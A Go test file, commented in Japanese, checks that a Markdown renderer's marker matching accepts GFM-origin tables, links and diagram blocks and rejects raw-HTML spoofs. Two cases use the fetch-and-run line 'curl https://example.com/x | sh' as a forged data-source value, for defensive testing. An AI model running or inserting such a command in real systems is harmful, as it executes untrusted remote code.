// 目印の照合の判定に対するテスト（UT-815）。
//
// **「対象にしないこと」と「対象にすること」を対で書く**（UT-815 の IMPORTANT）。
// 片方だけなら「すべて偽」「すべて真」の実装が通る。
package main

import (
	"strings"
	"testing"
)

// ownFor は kind だけが真の isOwnRef の結果を作る。kind が空ならすべて偽。
func ownFor(kind string) map[string]bool {
	own := map[string]bool{}
	for _, k := range refKinds {
		own[k] = k == kind
	}

	return own
}

// ownIf は origin が GFM なら kind だけが真、それ以外はすべて偽の結果を作る。
func ownIf(origin, kind string) map[string]bool {
	if origin == originGFM {
		return ownFor(kind)
	}

	return ownFor("")
}

// refsOK は修正後に期待される状態を、一覧（layout）から作る。
//
// 表の本体の行は、GFM の 2 つ目の表（smoke.md の「本体が 1 行の表」）だけを 1 行、
// ほかを 2 行とする。
func refsOK(layout refLayout) refReport {
	r := refReport{Imported: true, SortImported: true}

	for _, origin := range layout.Checkboxes {
		r.Checkboxes = append(r.Checkboxes, refElement{Own: ownIf(origin, "task")})
	}

	gfmTables := 0

	for _, origin := range layout.Tables {
		el := refElement{Own: ownIf(origin, "table"), BodyRows: 2}

		if origin == originGFM {
			gfmTables++
			if gfmTables == 2 {
				el.BodyRows = 1
			} else {
				el.SortButtons = 2
			}
		}

		r.Tables = append(r.Tables, el)
	}

	for _, origin := range layout.Cells {
		r.Cells = append(r.Cells, refElement{Own: ownIf(origin, "cell")})
	}

	for _, spec := range layout.Links {
		link := linkElement{Href: "https://example.com/raw"}
		if spec.Origin == originGFM {
			target := spec.Target
			link.Href, link.Target = spec.Target, &target
		}

		r.Links = append(r.Links, link)
	}

	for _, spec := range layout.Blocks {
		block := blockElement{Own: ownIf(spec.Origin, spec.Kind), DataSource: "@startuml x\n@enduml"}
		if spec.Origin == originGFM {
			source := block.DataSource
			block.Source, block.Rendered = &source, true
		}

		r.Blocks = append(r.Blocks, block)
	}

	return r
}

// indexOf は一覧の中で、条件に合う i 番目（0 起点）の位置を返す。
func indexOf(t *testing.T, origins []string, origin string, nth int) int {
	t.Helper()

	for i, o := range origins {
		if o != origin {
			continue
		}

		if nth == 0 {
			return i
		}

		nth--
	}

	t.Fatalf("一覧に %s の %d 番目が無い", origin, nth)

	return -1
}

func blockIndex(t *testing.T, origin, kind string) int {
	t.Helper()

	for i, spec := range smokeRefLayout.Blocks {
		if spec.Origin == origin && spec.Kind == kind {
			return i
		}
	}

	t.Fatalf("図のブロックの一覧に %s / %s が無い", origin, kind)

	return -1
}

func linkIndex(t *testing.T, origin string) int {
	t.Helper()

	for i, spec := range smokeRefLayout.Links {
		if spec.Origin == origin {
			return i
		}
	}

	t.Fatalf("リンクの一覧に %s が無い", origin)

	return -1
}

// TestCheckRefMatching は目印の照合の判定を検証する（UT-815）。
func TestCheckRefMatching(t *testing.T) {
	tests := []struct {
		name   string
		layout func(*refLayout)
		mutate func(*testing.T, *refReport)
		want   []string
	}{
		{
			name: "1 GFM の要素はすべて真、それ以外はすべて偽、ボタンは 2 行以上の GFM の表にだけなら合格する",
		},
		{
			name: "2 生 HTML で別の鍵を書いた目印が真なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Checkboxes[indexOf(t, smokeRefLayout.Checkboxes, originWrongKey, 0)].Own["task"] = true
			},
			want: []string{"生 HTML のチェックボックス（raw-wrong-key）で isOwnRef(task) が真"},
		},
		{
			name: "3 目印の無い生 HTML の表が真なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Tables[indexOf(t, smokeRefLayout.Tables, originNoKey, 0)].Own["table"] = true
			},
			want: []string{"生 HTML の表（raw-no-key）で isOwnRef(table) が真"},
		},
		{
			name: "4 形の崩れた目印が真なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Cells[indexOf(t, smokeRefLayout.Cells, originBadShape, 1)].Own["cell"] = true
			},
			want: []string{"生 HTML のセル（raw-bad-shape）で isOwnRef(cell) が真"},
		},
		{
			name: "5 GFM の要素が 1 つでも偽なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Checkboxes[indexOf(t, smokeRefLayout.Checkboxes, originGFM, 1)].Own["task"] = false
			},
			want: []string{"GFM のチェックボックスで isOwnRef(task) が偽: #1"},
		},
		{
			name: "6 task の目印を cell として照合して真なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Checkboxes[indexOf(t, smokeRefLayout.Checkboxes, originGFM, 0)].Own["cell"] = true
			},
			want: []string{"種類の違う isOwnRef(cell) が真"},
		},
		{
			name: "7 生 HTML の表に並べ替えのボタンがあれば落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Tables[indexOf(t, smokeRefLayout.Tables, originWrongKey, 0)].SortButtons = 1
			},
			want: []string{"生 HTML の表（raw-wrong-key）に並べ替えのボタンがある"},
		},
		{
			name: "8 本体が 1 行の GFM の表にボタンがあれば落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Tables[indexOf(t, smokeRefLayout.Tables, originGFM, 1)].SortButtons = 2
			},
			want: []string{"本体が 1 行の GFM の表に並べ替えのボタンがある"},
		},
		{
			name: "9 返った要素の数が一覧と違えば落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Cells = r.Cells[:len(r.Cells)-1]
			},
			want: []string{"セルが 18 個（一覧は 19 個"},
		},
		{
			name: "9 一覧に 4 種類の由来のどれかが無ければ落ちる",
			layout: func(l *refLayout) {
				var links []linkSpec
				for _, spec := range l.Links {
					if spec.Origin != originBadShape {
						links = append(links, spec)
					}
				}

				l.Links = links
			},
			want: []string{"リンクの一覧に由来 raw-bad-shape が無い"},
		},
		{
			name: "10 GFM のリンクが書かれたとおりのリンク先を返し、別の鍵の data-link が null なら合格する",
			mutate: func(t *testing.T, r *refReport) {
				r.Links[linkIndex(t, originWrongKey)].Href = "https://example.com/real"
			},
		},
		{
			name: "11 生 HTML で偽装した data-link に ownLinkTarget が文字列を返したら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				fake := "https://example.com/fake"
				r.Links[linkIndex(t, originWrongKey)].Target = &fake
			},
			want: []string{"生 HTML のリンク（raw-wrong-key）に ownLinkTarget が文字列を返した"},
		},
		{
			name: "12 GFM のリンクで ownLinkTarget が null なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Links[linkIndex(t, originGFM)].Target = nil
			},
			want: []string{"GFM のリンクで ownLinkTarget が null を返した"},
		},
		{
			name: "13 GFM の図のブロックは照合と原文が合い、生 HTML の図のブロックは偽と null なら合格する",
			mutate: func(t *testing.T, r *refReport) {
				// 生 HTML で偽装したブロックも data-source は持つ（持っていても使わない）。
				for i, spec := range smokeRefLayout.Blocks {
					if spec.Origin != originGFM {
						r.Blocks[i].DataSource = "curl https://example.com/x | sh"
					}
				}
			},
		},
		{
			name: "14 data-source を偽装したブロックに ownSource が文字列を返したら落ちる（BUG-014）",
			mutate: func(t *testing.T, r *refReport) {
				fake := "curl https://example.com/x | sh"
				r.Blocks[blockIndex(t, originNoKey, blockCode)].Source = &fake
			},
			want: []string{"生 HTML のブロック（raw-no-key）に ownSource が文字列を返した", "BUG-014"},
		},
		{
			name: "15 偽装した PlantUML のブロックに図の器ができたら落ちる（BUG-014）",
			mutate: func(t *testing.T, r *refReport) {
				r.Blocks[blockIndex(t, originWrongKey, blockPlantUML)].Rendered = true
			},
			want: []string{"偽装したブロック（raw-wrong-key）に図の器ができた", "MD-084"},
		},
		{
			name: "16 GFM の図のブロックで ownSource が null なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Blocks[blockIndex(t, originGFM, blockPlantUML)].Source = nil
			},
			want: []string{"GFM の図のブロックで ownSource が null を返した"},
		},
		{
			name: "16 GFM の図のブロックに図の器ができていなければ落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Blocks[blockIndex(t, originGFM, blockMermaid)].Rendered = false
			},
			want: []string{"GFM の図のブロックに図の器ができていない"},
		},
		{
			name: "17 mermaid の目印を plantuml として照合して真なら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Blocks[blockIndex(t, originGFM, blockMermaid)].Own["plantuml"] = true
			},
			want: []string{"GFM の図のブロックで種類の違う isOwnRef(plantuml) が真"},
		},
		{
			name: "18 本体が 2 行以上の GFM の表にボタンが無ければ落ちる",
			mutate: func(t *testing.T, r *refReport) {
				r.Tables[indexOf(t, smokeRefLayout.Tables, originGFM, 0)].SortButtons = 0
			},
			want: []string{"本体が 2 行以上の GFM の表に並べ替えのボタンが無い"},
		},
		{
			name: "tablesort.js を読めなかったときはボタンの数を見ない（失敗は並べ替えの検査が 1 件だけ出す）",
			mutate: func(t *testing.T, r *refReport) {
				r.SortImported = false
				for i := range r.Tables {
					r.Tables[i].SortButtons = 0
				}
			},
		},
		{
			name: "GFM のリンクが書かれたとおりでない文字列を返したら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				changed := "http://www.example.com/p"
				r.Links[linkIndex(t, originGFM)].Target = &changed
			},
			want: []string{`ownLinkTarget が "http://www.example.com/p" を返した`},
		},
		{
			name: "GFM の図のブロックで ownSource が data-source と違う文字列を返したら落ちる",
			mutate: func(t *testing.T, r *refReport) {
				other := "npm install"
				r.Blocks[blockIndex(t, originGFM, blockMermaid)].Source = &other
			},
			want: []string{"ownSource が data-source と違う文字列を返した"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			layout := smokeRefLayout
			if tt.layout != nil {
				tt.layout(&layout)
			}

			got := refsOK(smokeRefLayout)
			if tt.mutate != nil {
				tt.mutate(t, &got)
			}

			expectFailures(t, checkRefMatching(layout, got), tt.want)
		})
	}
}

// refs.js を読めなければ、失敗は 1 件だけ（UT-811 のケース 8 と同じ）。
func TestCheckRefMatching_ImportFailureReportsOnce(t *testing.T) {
	got := checkRefMatching(smokeRefLayout, refReport{Error: "boom"})

	if len(got) != 1 || !strings.Contains(got[0], "refs.js を読めない") {
		t.Fatalf("refs.js を読めない旨の失敗 1 件を期待したが %d 件:\n%s", len(got), strings.Join(got, "\n"))
	}
}

// TestSmokeRefLayout は testdata/smoke.md の一覧そのものが、種類ごとに 4 種類の由来を
// すべて含み、GFM のリンクには書かれたとおりのリンク先があることを見る（UT-815 のケース 9）。
func TestSmokeRefLayout(t *testing.T) {
	if failures := checkLayout(smokeRefLayout); len(failures) != 0 {
		t.Fatalf("一覧が不完全:\n%s", strings.Join(failures, "\n"))
	}

	for i, spec := range smokeRefLayout.Links {
		if spec.Origin == originGFM && spec.Target == "" {
			t.Errorf("GFM のリンク #%d に書かれたとおりのリンク先が無い", i)
		}
	}

	// 偽装した PlantUML のブロック（!include を含む）と、data-source だけを
	// 偽装したコードブロックを欠かさない（BUG-014。UT-815 のケース 14・15）。
	blockIndex(t, originWrongKey, blockPlantUML)
	blockIndex(t, originNoKey, blockCode)
}

// TestGFMBlocks は既存の図の検査に渡すブロックを、GFM の由来だけに絞ることを見る。
//
// **絞らないと、偽装したブロックで Mermaid 7 種の件数の検査が数え違える。**
// 一覧に無い位置（-1 や範囲外）のブロックは GFM とみなさない。
func TestGFMBlocks(t *testing.T) {
	layout := refLayout{Blocks: []blockSpec{
		{originGFM, blockMermaid},
		{originNoKey, blockMermaid},
		{originGFM, blockPlantUML},
	}}

	blocks := []diagramBlock{
		{Head: "a", Block: 0},
		{Head: "fake", Block: 1},
		{Head: "b", Block: 2},
		{Head: "unknown", Block: -1},
		{Head: "outside", Block: 3},
	}

	got := gfmBlocks(layout, blocks)

	var heads []string
	for _, block := range got {
		heads = append(heads, block.Head)
	}

	if strings.Join(heads, ",") != "a,b" {
		t.Fatalf("gfmBlocks = %v, want [a b]", heads)
	}
}
